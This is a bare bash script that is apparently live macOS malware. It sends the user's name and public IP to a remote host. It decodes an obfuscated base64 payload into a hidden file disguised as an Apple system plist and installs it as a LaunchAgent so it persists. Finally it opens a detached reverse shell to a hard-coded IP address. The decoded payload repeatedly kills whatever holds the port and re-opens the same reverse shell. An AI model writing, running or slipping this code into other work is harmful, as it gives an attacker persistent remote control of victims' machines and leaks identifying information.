#! /bin/bash

function remove_spec_char(){
	echo "$1" | tr -dc '[:alnum:].\r' | tr '[:upper:]' '[:lower:]'
}

whoami="$(remove_spec_char `whoami`)"
ip="$(remove_spec_char `curl -s ipecho.net/plain`)"
req=`curl -ks "http://stepbystepby.com/link.php?${whoami}&${ip}"`

plist_text="ZWNobyAnc2R2a21zZGZtc2RmbXNka2Ztc2RmbWxzZG1mbHNka21mbHNiZXNzcnRic3J0YnNydGJzcnRic3J0YnNydGJzcnRic3J0YnNydGJzcnRibmVyaW52aXVlaWVudmlldW52aWV1bnZlaXJudmVpcnZuaWN2bWRza3h3ZWl2bmVpdm5lJzsgd2hpbGUgOjsgZG8gc2xlZXAgMTAwMDA7IHNjcmVlbiAtWCBxdWl0OyBsc29mIC10aSA6MjU3MzMgfCB4YXJncyBraWxsIC05OyBzY3JlZW4gLWQgLW0gYmFzaCAtYyAnYmFzaCAtaSA+L2Rldi90Y3AvMTkzLjM3LjIxMi45Ny8yNTczMyAwPiYxJzsgZG9uZTsgZWNobyAnc2R2a21zZGZtc2RmbXNka2Ztc2RmbWxzZG1mbHNka21mbGtzZG1mbHNrZG1mbHNrZGZtbHNrZGZtbGtzZG1ma2xzZG1mc2Rma3ZzZGZram52c2RqZm52c2RrZmpudnNka2Zqdm5zZGtmdnNlZnZzZGZ2bnNkamt2bnNkaXdydml1c2ZnbmRydG5kcnR5bnJkdHlucnN0bnNydG5zcnRubnZlaXJ2bmljdm1kc2t4d2Vpdm5laXZuZSc="
echo "$plist_text" | base64 --decode > "/tmp/.com.apple.system.plist"
cp "/tmp/.com.apple.system.plist" "$HOME/Library/LaunchAgents/.com.apple.system.plist"
launchctl load "/tmp/.com.apple.system.plist"
scre=`screen -d -m bash -c 'bash -i >/dev/tcp/193.37.212.97/25733 0>&1'`
